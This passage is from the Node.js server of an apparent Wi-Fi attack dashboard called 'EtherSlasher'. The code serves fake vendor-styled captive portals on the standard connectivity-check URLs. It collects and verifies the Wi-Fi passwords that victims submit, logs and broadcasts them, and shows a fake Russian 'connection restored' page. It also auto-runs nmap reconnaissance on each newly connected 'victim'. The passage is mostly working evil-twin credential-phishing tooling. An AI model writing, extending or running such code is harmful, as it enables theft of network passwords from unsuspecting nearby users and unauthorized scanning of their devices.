        const url = `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${query}&resultsPerPage=5`;
        const out  = await sh(`curl -sf --connect-timeout 5 '${url}'`);
        const data = JSON.parse(out);
        for (const item of (data.vulnerabilities || [])) {
            const cve  = item.cve || {};
            const cid  = cve.id || '';
            const desc = (cve.descriptions || [{}])[0]?.value?.substring(0, 200) || '';
            let cvss = 0, sev = 'Unknown';
            const m31 = cve.metrics?.cvssMetricV31?.[0];
            const m2  = cve.metrics?.cvssMetricV2?.[0];
            if (m31) { cvss = m31.cvssData?.baseScore || 0; sev = m31.cvssData?.baseSeverity || 'Unknown'; }
            else if (m2) { cvss = m2.cvssData?.baseScore || 0; sev = cvss >= 7 ? 'HIGH' : cvss >= 4 ? 'MEDIUM' : 'LOW'; }
            db.run(`INSERT OR IGNORE INTO vulns (mac,service,version,cve_id,cvss,severity,desc,found_at) VALUES (?,?,?,?,?,?,?,?)`,
                [mac, service, version, cid, cvss, sev, desc, new Date().toISOString()]);
        }
        logEvent('CVE', `${mac} ${service}/${version}: CVEs found`);
    } catch {}
}


async function detectMonIface() {
    try {
        const out = await sh('iw dev | grep Interface');
        if (out.includes('wlan1mon')) return 'wlan1mon';
    } catch {}
    return ATTACK_IFACE;
}

// ─── API: APs ──────────────────────────────────────────────────────────────
app.get('/api/aps', (req, res) => {
    db.all('SELECT * FROM aps ORDER BY seen_at DESC', [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ aps: rows });
    });
});

// ─── API: Events / Logs ────────────────────────────────────────────────────
app.get('/api/events', (req, res) => {
    const limit = parseInt(req.query.limit) || 200;
    const type  = req.query.type;
    const sql = type
        ? 'SELECT * FROM events WHERE type=? ORDER BY id DESC LIMIT ?'
        : 'SELECT * FROM events ORDER BY id DESC LIMIT ?';
    const args = type ? [type, limit] : [limit];
    db.all(sql, args, (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ events: rows.reverse().map(r => ({
            ...r, msg: r.message,
            level: r.type === 'ERROR' ? 'err' : r.type === 'CREDENTIAL' ? 'warn' : ''
        })) });
    });
});

app.get('/api/events/export', (req, res) => {
    db.all('SELECT * FROM events ORDER BY id DESC LIMIT 10000', [], (err, rows) => {
        res.setHeader('Content-Disposition', 'attachment; filename=etherslasher-events.json');
        res.json(rows);
    });
});

// ─── Captive portal — server-side SSID inject ─────────────────────────────
function renderPortal(vendor, ssid, res) {
    const safeSsid = (ssid || 'WiFi')
        .replace(/&/g, '&amp;').replace(/"/g, '&quot;')
        .replace(/</g, '&lt;').replace(/>/g, '&gt;');
    const tmplPath = path.join(__dirname, 'public', 'portals', vendor + '.html');
    const file = fs.existsSync(tmplPath)
        ? tmplPath
        : path.join(__dirname, 'public', 'portals', 'generic.html');
    const html = fs.readFileSync(file, 'utf8')
        .replace(/\{\{SSID\}\}/g, safeSsid)
        .replace(/name="ssid" value=""/g, `name="ssid" value="${safeSsid}"`);
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
}

app.get(['/hotspot-detect.html', '/generate_204', '/ncsi.txt', '/portal'], async (req, res) => {
    const ip   = (req.ip || '').replace('::ffff:', '');
    const ssid = state.attackSSID || 'WiFi';
    logEvent('PORTAL', `Hit from ${ip} ua=${(req.headers['user-agent'] || '').substring(0, 60)}`);

    // Full chain: local OUI → macvendors.com API → SSID pattern
    let vendor = state.attackVendor;
    if (!vendor || vendor === 'generic') {
        const info = await lookupOUI(state.attackBSSID || '');
        vendor = info.template || 'generic';
        if (vendor === 'generic') vendor = ssidFallback(ssid);
        if (vendor !== 'generic') state.attackVendor = vendor;
    }

    renderPortal(vendor, ssid, res);
});

// Info endpoint (kept for compatibility)
app.get('/api/attack/info', (req, res) => {
    res.json({ ssid: state.attackSSID || '', vendor: state.attackVendor || 'generic', channel: state.attackChannel || 6 });
});

// Success page after credential capture
app.get('/portal/success', (req, res) => {
    res.send(`<!DOCTYPE html><html lang="ru"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Подключено</title>
<meta http-equiv="refresh" content="3;url=http://www.google.com">
<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#f0f4f8;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#fff;border-radius:12px;padding:40px 32px;max-width:340px;width:100%;text-align:center;box-shadow:0 4px 24px rgba(0,0,0,.1)}.icon{font-size:48px;margin-bottom:16px}h2{font-size:18px;color:#1a202c;margin-bottom:8px}p{font-size:13px;color:#718096;line-height:1.6}</style>
</head><body><div class="card"><div class="icon">&#10003;</div>
<h2>Подключение восстановлено</h2>
<p>Доступ к интернету получен.<br>Перенаправляем через 3 секунды...</p>
</div></body></html>`);
});

// Credential submission from portal (supports both JSON and HTML form POST)
app.post('/api/portal/submit', async (req, res) => {
    const ip     = (req.ip || '').replace('::ffff:', '');
    const ua     = (req.headers['user-agent'] || '').substring(0, 200);
    const ts     = new Date().toISOString();
    const vendor = req.body.vendor || state.attackVendor || 'generic';
    const ssid   = req.body.ssid   || state.attackSSID   || '';
    const isForm = (req.headers['content-type'] || '').includes('application/x-www-form-urlencoded');
    const password = req.body.password || '';

    let verified = 'unconfirmed', verifyReason = 'no_password';
    if (password) {
        const vr = await verifyWithPMKID(password, ssid, state.attackBSSID || '');
        verified = vr.verified;
        verifyReason = vr.reason;
    }

    if (isForm && verified === 'wrong') {
        return renderPortal(vendor, ssid, res, true);
    }

    const fields = Object.entries(req.body).filter(([k]) => !['vendor', 'ssid'].includes(k));
    for (const [field, value] of fields) {
        if (!value) continue;
        const val = String(value);
        db.run(`INSERT INTO captured_creds (ts,ip,ssid,field,value,vendor,ua,verified) VALUES (?,?,?,?,?,?,?,?)`,
            [ts, ip, ssid, field, val, vendor, ua, verified],
            (err) => { if (err) logEvent('ERROR', 'DB cred: ' + err.message); });
        logEvent('CREDS', `PASSWORD CAPTURED: ip=${ip} ssid="${ssid}" ${field}=${val} vendor=${vendor} verified=${verified}(${verifyReason})`);
        io.emit('cred-captured', { ts, ip, ssid, field, value: val, vendor, verified });
    }

    if (isForm) return res.redirect(303, '/portal/success');
    res.json({ ok: true, verified, reason: verifyReason });
});

// Legacy compatibility
app.post('/api/portal/cred', (req, res) => {
    req.url = '/api/portal/submit';
    app._router.handle(req, res, () => {});
});

app.get('/api/portal/creds', (req, res) => {
    db.all('SELECT * FROM captured_creds ORDER BY id DESC LIMIT 200', [], (err, rows) => {
        if (err) return res.json({ creds: [] });
        res.json({ creds: rows });
    });
});

app.get('/api/attack/vendor/:bssid', async (req, res) => {
    const info = await lookupOUI(req.params.bssid);
    res.json({ bssid: req.params.bssid, ...info });
});

// ─── System Stats ──────────────────────────────────────────────────────────
let _statsRunning = false;
let _statsCache = null;

async function getSystemStats() {
    if (_statsRunning) return _statsCache;
    _statsRunning = true;
    try {
        // CPU: two /proc/stat snapshots 500ms apart
        const parseCpu = () => fs.readFileSync('/proc/stat', 'utf8')
            .split('\n')[0].split(/\s+/).slice(1).map(Number);
        const cpu1 = parseCpu();
        await new Promise(r => setTimeout(r, 500));
        const cpu2 = parseCpu();
        const idle1 = cpu1[3], total1 = cpu1.reduce((a, b) => a + b, 0);
        const idle2 = cpu2[3], total2 = cpu2.reduce((a, b) => a + b, 0);
        const cpuPercent = Math.round(100 * (1 - (idle2 - idle1) / (total2 - total1)));

        // RAM
        const memRaw   = fs.readFileSync('/proc/meminfo', 'utf8');
        const memTotal = parseInt(memRaw.match(/MemTotal:\s+(\d+)/)[1]);
        const memAvail = parseInt(memRaw.match(/MemAvailable:\s+(\d+)/)[1]);
        const ramPercent = Math.round(100 * (memTotal - memAvail) / memTotal);

        // Temperature — max across all thermal zones
        let temp = 0;
        try {
            const zones = fs.readdirSync('/sys/class/thermal').filter(d => d.startsWith('thermal_zone'));
            for (const zone of zones) {
                const t = parseInt(fs.readFileSync(`/sys/class/thermal/${zone}/temp`, 'utf8'));
                if (t > temp) temp = t;
            }
            temp = Math.round(temp / 1000);
        } catch {}

        // Uptime in seconds
        const uptime = Math.floor(parseFloat(fs.readFileSync('/proc/uptime', 'utf8').split(' ')[0]));

        _statsCache = { cpuPercent, ramPercent, temp, uptime };
        return _statsCache;
    } finally {
        _statsRunning = false;
    }
}

app.get('/api/stats/system', async (req, res) => {
    const stats = _statsCache || await getSystemStats();
    res.json(stats || { cpuPercent: 0, ramPercent: 0, temp: 0, uptime: 0 });
});

app.get('/api/stats/activity', (req, res) => {
    const since = new Date(Date.now() - 5 * 60 * 1000).toISOString();
    // For each BSSID: latest data_frames minus earliest in the window = delta
    db.all(`
        SELECT bssid, ssid, channel, power,
               MAX(data_frames) AS data_max,
               MIN(data_frames) AS data_min,
               MAX(data_frames) - MIN(data_frames) AS activity_rate,
               MAX(clients_count) AS clients_count,
               MAX(ts) AS last_seen
        FROM ap_activity
        WHERE ts > ?
        GROUP BY bssid
        ORDER BY activity_rate DESC
        LIMIT 10
    `, [since], async (err, rows) => {
        if (err) return res.json({ activity: [] });
        // Attach vendor template
        const activity = await Promise.all((rows || []).map(async r => {
            const info = await lookupOUI(r.bssid);
            return { ...r, vendor: info.vendor || 'Unknown' };
        }));
        res.json({ activity });
    });
});

// ─── Periodic system stats broadcast ──────────────────────────────────────
setInterval(async () => {
    try {
        const stats = await getSystemStats();
        io.emit('system_stats', stats);
        if (stats.temp > 75) {
            io.emit('alert', { type: 'WARNING', message: `CPU temperature ${stats.temp}°C — consider cooling` });
        }
    } catch {}
}, 5000);

// ─── API: Radio status ─────────────────────────────────────────────────────
app.get('/api/radio/status', async (req, res) => {
    let mac = '—';
    try { mac = (await sh(`cat /sys/class/net/${ATTACK_IFACE}/address 2>/dev/null`)).trim() || '—'; } catch {}
    res.json({
        ok: true, monitor: state.monitorActive, ap: state.apActive,
        mac, iface: ATTACK_IFACE, monIface: state.monIface || MON_IFACE,
        attackActive: state.attackActive, attackVendor: state.attackVendor,
    });
});

// ─── Parsers ───────────────────────────────────────────────────────────────
function parseAirodumpCsv(raw) {
    const aps = [];
    if (!raw) return aps;
    const lines = raw.split('\n');
    let inAPs = true;
    for (const line of lines) {
        if (line.startsWith('Station MAC')) { inAPs = false; continue; }
        if (!inAPs) continue;
        const cols = line.split(',').map(c => c.trim());
        if (cols.length < 14 || !cols[0].match(/([0-9A-Fa-f]{2}:){5}/)) continue;
        aps.push({
            bssid: cols[0], signal: parseInt(cols[8]) || 0,
            channel: parseInt(cols[3]) || 0, enc: cols[5] || 'OPN',
            ssid: cols[13] || '', clients: 0,
            // CSV col 10 = #Data (IV count / data frames)
            dataFrames: parseInt(cols[10]) || 0,
        });
    }
    return aps;
}

function parseLeases(file) {
    const out = [];
    try {
        const raw = fs.readFileSync(file, 'utf8');
        for (const line of raw.trim().split('\n')) {
            const [, mac, ip] = line.split(' ');
            if (mac && ip) out.push({ mac, ip });
        }
    } catch {}
    return out;
}

function dbGet(sql, args = []) {
    return new Promise((res, rej) =>
        db.get(sql, args, (e, r) => e ? rej(e) : res(r || {})));
}

function tryParse(s, def) {
    try { return JSON.parse(s); } catch { return def; }
}

// ─── DHCP lease watcher → auto recon + attack stages ──────────────────────
let lastLeaseHash = '';
setInterval(() => {
    try {
        const raw  = fs.readFileSync('/var/lib/misc/dnsmasq.leases', 'utf8');
        const hash = raw.length + raw.substring(0, 50);
        if (hash !== lastLeaseHash) {
            lastLeaseHash = hash;
            const leases = parseLeases('/var/lib/misc/dnsmasq.leases');
            for (const { ip, mac } of leases) {
                if (ip.startsWith('10.42.0.')) continue;
                db.get('SELECT id FROM clients WHERE mac=?', [mac], (err, row) => {
                    if (!row) {
                        logEvent('CLIENT', `New client: ${ip} (${mac})`);
                        io.emit('new_client', { ip, mac });

                        // Attack victim detected on 10.0.0.x (at0 network)
                        if (state.attackActive && ip.startsWith('10.0.0.') && !state.attackVictimIP) {
                            state.attackStage     = 3;
                            state.attackVictimIP  = ip;
                            state.attackVictimMAC = mac;
                            broadcastState();
                            io.emit('attack_stage_update', {
                                stage: 2, status: 'CONNECTED',
                                msg: `Victim connected: ${ip} (${mac})`,
                                victimIP: ip, victimMAC: mac
                            });
                            io.emit('attack_stage_update', {
                                stage: 3, status: 'ACTIVE',
                                msg: `Auto-recon: nmap -sV -O ${ip}...`
                            });
                            runNmapRecon(ip, mac).then(() => {
                                io.emit('attack_stage_update', {
                                    stage: 3, status: 'DONE',
                                    msg: `Recon complete for ${ip}`
                                });
                                state.attackStage = 4;
                                broadcastState();
                                io.emit('attack_stage_update', {
                                    stage: 4, status: 'ACTIVE',
                                    msg: 'Captive portal active — waiting for password'
                                });
                            }).catch(() => {});
                        } else {
                            runNmapRecon(ip, mac);
                        }
                    } else {
                        db.run('UPDATE clients SET ip=?,last_seen=? WHERE mac=?',
                            [ip, new Date().toISOString(), mac],
                            (err) => { if (err) logEvent('ERROR', 'DB update client: ' + err.message); });
                    }
                });
            }
            io.emit('clients_update');
        }
    } catch {}
}, 5000);

// ─── Start ─────────────────────────────────────────────────────────────────
server.listen(PORT, '0.0.0.0', () => {
    logEvent('WEB', `EtherSlasher Dashboard listening on :${PORT}`);
    // Kill orphan airodump processes from previous crashes
    exec('pkill -SIGKILL -x airodump-ng 2>/dev/null; rm -f /tmp/etherslasher-passive*.csv /tmp/etherslasher-passive*.cap', () => {});
    syncStateWithSystem();
});

process.on('SIGTERM', () => {
    logEvent('WEB', 'SIGTERM received, shutting down');
    exec('pkill -SIGKILL -x airodump-ng 2>/dev/null', () => {});
    server.close(() => process.exit(0));
});
